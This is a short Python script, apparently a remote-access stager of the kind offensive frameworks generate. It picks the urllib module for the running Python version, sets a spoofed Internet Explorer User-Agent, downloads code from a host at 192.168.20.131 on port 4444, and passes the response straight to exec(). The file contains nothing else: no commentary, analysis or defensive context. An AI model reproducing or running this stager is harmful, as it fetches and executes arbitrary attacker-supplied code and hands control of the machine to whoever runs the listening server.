import sys
vi=sys.version_info
ul=__import__({2:'urllib2',3:'urllib.request'}[vi[0]],fromlist=['build_opener'])
hs=[]
o=ul.build_opener(*hs)
o.addheaders=[('User-Agent','Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko')]
exec(o.open('http://192.168.20.131:4444/g7inKXYKdI9wpGWwLk9fYAt0Ag8S97oWa-KFdUnfyYmz0FFAQlCkljeGt-C7F76jej319TQd8mlbFR-nbh8JWq7UdZWkM9P9WG5fsRVUGiya3uRGBVuJ7yuU6ZKISaqIRL5cV-GJG01ZkEtj_Uyi0aPIw_o6cuVlY4zE1_nBcIvXy_t9EsPRjYP5paWFHWZQYmxTwSm00CquBDX7AL2qBD4kaeLAJZ15k3QA1WNZ').read())